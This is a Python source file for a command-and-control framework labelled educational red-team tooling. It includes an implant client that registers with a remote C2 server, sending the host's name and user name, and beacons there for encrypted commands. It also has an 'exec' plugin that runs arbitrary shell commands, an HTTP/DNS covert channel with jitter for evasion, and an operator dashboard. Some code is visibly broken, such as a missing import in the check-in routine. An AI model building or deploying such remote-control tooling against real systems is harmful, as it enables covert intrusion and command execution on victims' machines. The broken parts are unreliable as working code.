#!/usr/bin/env python3
"""
Advanced C2 Framework — Educational/Authorized Red Team Operations
=================================================================
A modular Command & Control framework for authorized security testing.

Components:
    • Beaconing: HTTP / DNS / HTTPS channels with jitter
    • Crypto: AES-256-GCM session + RSA key exchange
    • Plugins: Extensible module system for post-ex commands
    • Dashboard: Web UI for implant management
    • Dispatcher: Command routing + result aggregation
"""

from __future__ import annotations

import abc
import argparse
import base64
import hashlib
import hmac
import json
import os
import queue
import secrets
import socket
import struct
import subprocess
import sys
import threading
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, field, asdict
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Protocol, Tuple

# ─── Cryptography ────────────────────────────────────────────────────────────

try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.backends import default_backend
    _CRYPTO_AVAILABLE = True
except ImportError:
    _CRYPTO_AVAILABLE = False
    print("[!] cryptography library not available. Install: pip install cryptography")


class CryptoManager:
    """Handles RSA key exchange + AES-256-GCM session encryption."""

    def __init__(self) -> None:
        if not _CRYPTO_AVAILABLE:
            raise RuntimeError("cryptography library required")
        self.private_key = rsa.generate_private_key(65537, 2048, default_backend())
        self.public_key = self.private_key.public_key()
        self._session_keys: Dict[str, bytes] = {}  # implant_id -> aes_key

    def get_public_key_pem(self) -> bytes:
        """Export public key for implant distribution."""
        return self.public_key.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )

    def decrypt_session_key(self, implant_id: str, encrypted_key: bytes) -> bytes:
        """RSA-decrypt the AES session key sent by an implant."""
        aes_key = self.private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                padding.MGF1(hashes.SHA256()),
                hashes.SHA256(),
                None,
            ),
        )
        self._session_keys[implant_id] = aes_key
        return aes_key

    def encrypt(self, implant_id: str, plaintext: bytes) -> bytes:
        """AES-256-GCM encrypt: nonce(12) || ciphertext+tag."""
        aesgcm = AESGCM(self._session_keys[implant_id])
        nonce = os.urandom(12)
        ct = aesgcm.encrypt(nonce, plaintext, None)
        return nonce + ct

    def decrypt(self, implant_id: str, data: bytes) -> bytes:
        """AES-256-GCM decrypt."""
        aesgcm = AESGCM(self._session_keys[implant_id])
        nonce, ct = data[:12], data[12:]
        return aesgcm.decrypt(nonce, ct, None)

    def encrypt_with_key(self, key: bytes, plaintext: bytes) -> bytes:
        """Encrypt using a raw key (used by implant side)."""
        aesgcm = AESGCM(key)
        nonce = os.urandom(12)
        return nonce + aesgcm.encrypt(nonce, plaintext, None)

    def decrypt_with_key(self, key: bytes, data: bytes) -> bytes:
        """Decrypt using a raw key."""
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(data[:12], data[12:], None)


# ─── Beacon Channels ──────────────────────────────────────────────────────────

class BeaconChannel(abc.ABC):
    """Abstract transport channel for C2 beaconing."""

    @abc.abstractmethod
    def send(self, data: bytes, destination: str) -> bytes | None:
        """Send data and return response bytes (or None)."""
        ...

    @abc.abstractmethod
    def receive(self, timeout: float = 30.0) -> Tuple[bytes, str] | None:
        """Receive data and return (data, source)."""
        ...


class HTTPBeacon(BeaconChannel):
    """HTTP POST/GET beacon with optional jitter for sleep evasion."""

    def __init__(self, user_agent: str = "Mozilla/5.0", jitter: float = 0.2) -> None:
        self.user_agent = user_agent
        self.jitter = jitter

    def sleep_with_jitter(self, base_interval: float) -> None:
        """Sleep base_interval ± jitter fraction."""
        delta = base_interval * self.jitter * (secrets.randbelow(2000) / 1000 - 1)
        time.sleep(max(0.5, base_interval + delta))

    def send(self, data: bytes, destination: str) -> bytes | None:
        import urllib.request
        req = urllib.request.Request(
            destination,
            data=base64.b64encode(data),
            headers={"User-Agent": self.user_agent, "Content-Type": "application/octet-stream"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                return base64.b64decode(resp.read())
        except Exception:
            return None

    def receive(self, timeout: float = 30.0) -> Tuple[bytes, str] | None:
        raise NotImplementedError("Use the server-side dashboard handler for HTTP receive.")


class DNSBeacon(BeaconChannel):
    """DNS TXT record-based covert channel (simplified simulation)."""

    def __init__(self, dns_server: str = "8.8.8.8", domain: str = "c2.lab") -> None:
        self.dns_server = dns_server
        self.domain = domain

    def send(self, data: bytes, destination: str) -> bytes | None:
        """Encode data as DNS subdomain labels and query."""
        encoded = base64.b32encode(data).decode().rstrip("=")
        # Split into 63-char labels (DNS label limit)
        labels = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        query = ".".join(labels) + "." + self.domain
        try:
            result = socket.gethostbyname(query)
            return result.encode()
        except socket.gaierror:
            return None

    def receive(self, timeout: float = 30.0) -> Tuple[bytes, str] | None:
        raise NotImplementedError("DNS receive requires a custom DNS server listener.")


# ─── Plugin System ────────────────────────────────────────────────────────────

class Plugin(abc.ABC):
    """Base class for C2 post-exploitation plugins."""

    name: str = "base"
    description: str = "Base plugin interface"

    @abc.abstractmethod
    def run(self, implant: "Implant", params: Dict[str, Any]) -> Dict[str, Any]:
        ...


class ExecPlugin(Plugin):
    """Execute system commands on the implant."""

    name = "exec"
    description = "Execute system commands"

    def run(self, implant: "Implant", params: Dict[str, Any]) -> Dict[str, Any]:
        cmd = params.get("command", "")
        if not cmd:
            return {"error": "No command specified"}
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
            }
        except subprocess.TimeoutExpired:
            return {"error": "Command timed out"}


class PluginRegistry:
    """Registry for loading and dispatching plugins."""

    def __init__(self) -> None:
        self._plugins: Dict[str, Plugin] = {}
        self._register_defaults()

    def _register_defaults(self) -> None:
        """Register built-in plugins."""
        self.register(ExecPlugin())

    def register(self, plugin: Plugin) -> None:
        """Register a plugin instance."""
        self._plugins[plugin.name] = plugin

    def get(self, name: str) -> Optional[Plugin]:
        return self._plugins.get(name)

    def list_plugins(self) -> List[Dict[str, str]]:
        return [{"name": p.name, "description": p.description} for p in self._plugins.values()]

    def dispatch(self, implant: "Implant", plugin_name: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Dispatch a plugin execution."""
        plugin = self.get(plugin_name)
        if not plugin:
            return {"error": f"Unknown plugin: {plugin_name}"}
        try:
            return plugin.run(implant, params)
        except Exception as e:
            return {"error": str(e)}


# ─── Data Models ──────────────────────────────────────────────────────────────

@dataclass
class Implant:
    """Represents a connected implant/beacon."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    hostname: str = ""
    username: str = ""
    os: str = ""
    last_seen: float = field(default_factory=time.time)
    first_seen: float = field(default_factory=time.time)
    channel: str = "http"
    status: str = "pending"  # pending | active | dead | lost
    metadata: Dict[str, Any] = field(default_factory=dict)

    def touch(self) -> None:
        self.last_seen = time.time()
        self.status = "active"

    @property
    def stale(self) -> bool:
        return time.time() - self.last_seen > 300  # 5 min timeout

    def to_dict(self) -> Dict[str, Any]:
        data = asdict(self)
        data["stale"] = self.stale
        data["last_seen_str"] = datetime.fromtimestamp(self.last_seen).isoformat()
        return data


@dataclass
class CommandTask:
    """A task dispatched to an implant."""
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    implant_id: str = ""
    plugin: str = ""
    params: Dict[str, Any] = field(default_factory=dict)
    dispatched_at: float = field(default_factory=time.time)
    status: str = "pending"  # pending | sent | completed | failed
    result: Optional[Dict[str, Any]] = None


# ─── C2 Server / Dispatcher ──────────────────────────────────────────────────

class C2Server:
    """
    Central C2 server: manages implants, dispatches commands,
    collects results, and hosts the web dashboard.
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 8080) -> None:
        self.host = host
        self.port = port
        self.crypto = CryptoManager()
        self.plugins = PluginRegistry()

        self._implants: Dict[str, Implant] = {}
        self._tasks: Dict[str, CommandTask] = {}
        self._results: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
        self._lock = threading.RLock()

        # Command queue per implant: implant_id -> Queue
        self._cmd_queues: Dict[str, queue.Queue] = defaultdict(queue.Queue)

        self._running = False
        self._httpd: Optional[ThreadingHTTPServer] = None

    # ── implant management ─────────────────────────────────────────────────

    def register_implant(self, implant: Implant) -> None:
        with self._lock:
            self._implants[implant.id] = implant

    def get_implant(self, implant_id: str) -> Optional[Implant]:
        with self._lock:
            return self._implants.get(implant_id)

    def list_implants(self) -> List[Dict[str, Any]]:
        with self._lock:
            return [imp.to_dict() for imp in self._implants.values()]

    def get_pending_commands(self, implant_id: str) -> Optional[Dict[str, Any]]:
        """Poll for next pending command (called by implant beacon)."""
        with self._lock:
            implant = self._implants.get(implant_id)
            if not implant:
                return None
            implant.touch()
            try:
                task = self._cmd_queues[implant_id].get_nowait()
                task.status = "sent"
                return {"task_id": task.id, "plugin": task.plugin, "params": task.params}
            except queue.Empty:
                return None

    # ── command dispatch ────────────────────────────────────────────────────

    def dispatch_command(self, implant_id: str, plugin: str, params: Dict[str, Any]) -> str:
        """Queue a command for an implant. Returns task_id."""
        task = CommandTask(implant_id=implant_id, plugin=plugin, params=params)
        with self._lock:
            self._tasks[task.id] = task
            self._cmd_queues[implant_id].put(task)
        return task.id

    def submit_result(self, implant_id: str, task_id: str, result: Dict[str, Any]) -> None:
        """Implant submits task result."""
        with self._lock:
            task = self._tasks.get(task_id)
            if task:
                task.status = "completed"
                task.result = result
            self._results[implant_id].append({
                "task_id": task_id,
                "timestamp": time.time(),
                "result": result,
            })

    def get_results(self, implant_id: str, limit: int = 50) -> List[Dict[str, Any]]:
        with self._lock:
            return self._results.get(implant_id, [])[-limit:]

    # ── web dashboard ───────────────────────────────────────────────────────

    def start_dashboard(self) -> None:
        """Start the embedded web dashboard + implant comms endpoint."""
        server = self
        crypto = self.crypto

        class DashboardHandler(BaseHTTPRequestHandler):
            """HTTP handler for implant comms and dashboard UI."""

            def log_message(self, fmt: str, *args: Any) -> None:  # suppress logs
                pass

            def _send_json(self, status: int, payload: Dict[str, Any]) -> None:
                body = json.dumps(payload).encode()
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def do_GET(self) -> None:
                if self.path == "/" or self.path == "/dashboard":
                    self._serve_dashboard()
                elif self.path == "/api/implants":
                    self._send_json(200, {"implants": server.list_implants()})
                elif self.path == "/api/plugins":
                    self._send_json(200, {"plugins": server.plugins.list_plugins()})
                elif self.path.startswith("/api/results/"):
                    imp_id = self.path.split("/")[-1]
                    self._send_json(200, {"results": server.get_results(imp_id)})
                elif self.path == "/api/key":
                    # Implant fetches C2 public key for RSA key exchange
                    pem = crypto.get_public_key_pem()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/octet-stream")
                    self.end_headers()
                    self.wfile.write(pem)
                else:
                    self._send_json(404, {"error": "Not found"})

            def do_POST(self) -> None:
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length) if length else b""

                if self.path == "/api/register":
                    # Implant registers: sends {id, hostname, os, encrypted_session_key}
                    data = json.loads(b"") if not body else json.loads(body)
                    imp = Implant(
                        id=data.get("id", str(uuid.uuid4())[:8]),
                        hostname=data.get("hostname", "unknown"),
                        username=data.get("username", "unknown"),
                        os=data.get("os", "unknown"),
                        channel=data.get("channel", "http"),
                    )
                    server.register_implant(imp)
                    # If implant sent encrypted session key, decrypt it
                    if data.get("session_key"):
                        enc_key = base64.b64decode(data["session_key"])
                        crypto.decrypt_session_key(imp.id, enc_key)
                    self._send_json(200, {"status": "registered", "implant_id": imp.id})

                elif self.path == "/api/checkin":
                    # Implant checks in; decrypt payload, return commands
                    data = json.loads(body) if body else {}
                    imp_id = data.get("implant_id", "")
                    # Decrypt results if present
                    if "payload" in data and imp_id in crypto._session_keys:
                        payload_bytes = base64.b64decode(data["payload"])
                        plaintext = crypto.decrypt(imp_id, payload_bytes)
                        payload = json.loads(plaintext)
                        for entry in payload.get("results", []):
                            server.submit_result(imp_id, entry["task_id"], entry["result"])
                    # Return next pending command (encrypted)
                    cmd = server.get_pending_commands(imp_id)
                    if cmd and imp_id in crypto._session_keys:
                        ct = crypto.encrypt(imp_id, json.dumps(cmd).encode())
                        self._send_json(200, {"payload": base64.b64encode(ct).decode()})
                    elif cmd:
                        self._send_json(200, {"command": cmd})
                    else:
                        self._send_json(200, {"command": None})

                elif self.path == "/api/dispatch":
                    # Dashboard dispatches a command
                    data = json.loads(body) if body else {}
                    task_id = server.dispatch_command(
                        data.get("implant_id", ""),
                        data.get("plugin", ""),
                        data.get("params", {}),
                    )
                    self._send_json(200, {"task_id": task_id})

                else:
                    self._send_json(404, {"error": "Not found"})

            def _serve_dashboard(self) -> None:
                """Serve a minimal single-file HTML dashboard."""
                html = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>C2 Dashboard</title>
<style>
  body{font-family:monospace;background:#0d1117;color:#c9d1d9;margin:0;padding:20px}
  h1{color:#58a6ff}table{width:100%;border-collapse:collapse;margin:10px 0}
  th,td{border:1px solid #30363d;padding:8px;text-align:left;font-size:13px}
  th{background:#161b22;color:#58a6ff}tr:hover{background:#161b22}
  .active{color:#3fb950}.dead{color:#f85149}.pending{color:#d29922}
  input,select,button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:6px;margin:2px}
  button{cursor:pointer}button:hover{background:#30363d}
  .panel{background:#161b22;border:1px solid #30363d;padding:15px;margin:10px 0;border-radius:6px}
  pre{background:#0d1117;padding:10px;border:1px solid #30363d;overflow:auto;max-height:300px}
  .grid{display:grid;grid-template-columns:1fr 1fr;gap:15px}
  .log{font-size:11px;color:#8b949e}
</style></head><body>
<h1>🖧 C2 Dashboard</h1>
<div class="panel"><h2>Implants</h2>
<table id="implant-table"><tr><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>Status</th><th>Last Seen</th><th>Actions</th></table>
</div><div class="grid"><div class="panel"><h2>Dispatch Command</h2>
<label>Implant: <select id="imp-select"></select></label><br>
<label>Plugin: <select id="plug-select"></select></label><br>
<label>Params:<br><textarea id="params" rows="4" style="width:90%">{}</textarea></label><br>
<button onclick="dispatch()">Dispatch</button><div id="disp-result" class="log"></div>
</div><div class="panel"><h2>Results</h2>
<label>Implant: <select id="res-select" onchange="loadResults()"></select></label>
<pre id="results">Select an implant</pre>
</div></div>
<script>
async function api(path,method='GET',body=null){const r=await fetch(path,{method,headers:{'Content-Type':'application/json'},body:body?JSON.stringify(body):null});return r.json()}
async function refresh(){
  const d=await api('/api/implants'),p=await api('/api/plugins');
  const t=document.getElementById('implant-table');
  t.innerHTML='<tr><th>ID</th><th>Host</th><th>User</th><th>OS</th><th>Status</th><th>Last Seen</th><th>Actions</th></tr>';
  const sel=document.getElementById('imp-select');sel.innerHTML='';
  const rsel=document.getElementById('res-select');rsel.innerHTML='';
  d.implants.forEach(i=>{
    t.innerHTML+=`<tr><td>${i.id}</td><td>${i.hostname}</td><td>${i.username}</td><td>${i.os}</td><td class="${i.status}">${i.status}</td><td>${i.last_seen_str}</td><td><button onclick="select('${i.id}')">Use</button></td></tr>`;
    sel.innerHTML+=`<option value="${i.id}">${i.id} (${i.hostname})</option>`;
    rsel.innerHTML+=`<option value="${i.id}">${i.id}</option>`;
  });
  const ps=document.getElementById('plug-select');ps.innerHTML='';
  p.plugins.forEach(p=>ps.innerHTML+=`<option value="${p.name}">${p.name}: ${p.description}</option>`);
}
function select(id){document.getElementById('imp-select').value=id;document.getElementById('res-select').value=id;loadResults()}
async function dispatch(){
  const data={implant_id:document.getElementById('imp-select').value,plugin:document.getElementById('plug-select').value,params:JSON.parse(document.getElementById('params').value||'{}')};
  const r=await api('/api/dispatch','POST',data);
  document.getElementById('disp-result').innerText='Task: '+r.task_id;
}
async function loadResults(){
  const id=document.getElementById('res-select').value;
  const d=await api('/api/results/'+id);
  document.getElementById('results').innerText=JSON.stringify(d.results,null,2);
}
refresh();setInterval(refresh,5000);
</script></body></html>"""
                body = html.encode()
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

        handler = DashboardHandler
        self._httpd = ThreadingHTTPServer((self.host, self.port), handler)
        self._running = True
        thread = threading.Thread(target=self._httpd.serve_forever, daemon=True)
        thread.start()
        print(f"[+] C2 Dashboard + comms server listening on {self.host}:{self.port}")
        print(f"[+] Public key PEM available at http://{self.host}:{self.port}/api/key")

    # ── lifecycle ──────────────────────────────────────────────────────────

    def shutdown(self) -> None:
        if self._httpd:
            self._httpd.shutdown()
            self._running = False
        print("[+] C2 server shut down.")


# ─── Implant Stub (client-side simulation) ───────────────────────────────────

class ImplantClient:
    """
    Simulated implant: establishes encrypted session, beacons,
    executes commands, returns results.
    """

    def __init__(self, c2_url: str) -> None:
        if not _CRYPTO_AVAILABLE:
            raise RuntimeError("cryptography library required")
        self.c2_url = c2_url.rstrip("/")
        self.implant_id: str = ""
        self.session_key: bytes = b""
        self.crypto = CryptoManager()

    def key_exchange(self) -> None:
        """Fetch C2 public key, generate AES session key, register it."""
        import urllib.request
        req = urllib.request.Request(f"{self.c2_url}/api/key")
        with urllib.request.urlopen(req, timeout=10) as resp:
            c2_pem = resp.read()
        # Load C2 public key
        from cryptography.hazmat.primitives.serialization import load_pem_public_key
        c2_pubkey = load_pem_public_key(c2_pem, default_backend())
        # Generate random AES-256 key and encrypt with C2's RSA pubkey
        self.session_key = os.urandom(32)
        encrypted_key = c2_pubkey.encrypt(
            self.session_key,
            padding.OAEP(padding.MGF1(hashes.SHA256()), hashes.SHA256(), None),
        )
        # Register implant
        payload = json.dumps({
            "id": str(uuid.uuid4())[:8],
            "hostname": socket.gethostname(),
            "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
            "os": sys.platform,
            "channel": "http",
            "session_key": base64.b64encode(encrypted_key).decode(),
        }).encode()
        req2 = urllib.request.Request(
            f"{self.c2_url}/api/register",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req2, timeout=10) as resp2:
            data = json.loads(resp2.read())
            self.implant_id = data["implant_id"]
        print(f"[+] Implant registered: {self.implant_id}")

    def checkin(self) -> Optional[Dict[str, Any]]:
        """Check in with C2, submit results, get new commands."""
        payload = json.dumps({"implant_id": self.implant_id, "results": []}).encode()
        encrypted = self.crypto.encrypt_with_key(self.session_key, payload)
        req = urllib.request.Request(
            f"{self.c2_url}/api/checkin",
            data=json.dumps({
                "implant_id": self.implant_id,
                "payload": base64.b64encode(encrypted).decode(),
            }).encode(),
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=15) as resp:
            response = json.loads(resp.read())
        if "payload" in response:
            pt = self.crypto.decrypt_with_key(self.session_key, base64.b64decode(response["payload"]))
            return json.loads(pt)
        return response.get("command")

    def beacon_loop(self, interval: float = 30.0) -> None:
        """Continuous beacon loop."""
        print(f"[+] Beacons to {self.c2_url} every ~{interval}s")
        while True:
            cmd = self.checkin()
            if cmd:
                print(f"[!] Received command: {cmd}")
            time.sleep(interval)


# ─── CLI Entry Point ─────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="Advanced C2 Framework")
    parser.add_argument("mode", choices=["server", "implant"], help="Run mode")
    parser.add_argument("--host", default="0.0.0.0", help="Server bind host")
    parser.add_argument("--port", type=int, default=8080, help="Server bind port")
    parser.add_argument("--c2", default="http://localhost:8080", help="C2 URL (implant mode)")
    parser.add_argument("--interval", type=float, default=30.0, help="Beacon interval (implant mode)")
    args = parser.parse_args()

    if args.mode == "server":
        print("[*] Starting C2 server...")
        server = C2Server(args.host, args.port)
        try:
            server.start_dashboard()
            print("[*] Press Ctrl+C to shutdown")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.shutdown()

    elif args.mode == "implant":
        print("[*] Starting implant...")
        client = ImplantClient(args.c2)
        client.key_exchange()
        client.beacon_loop(args.interval)


if __name__ == "__main__":
    main()
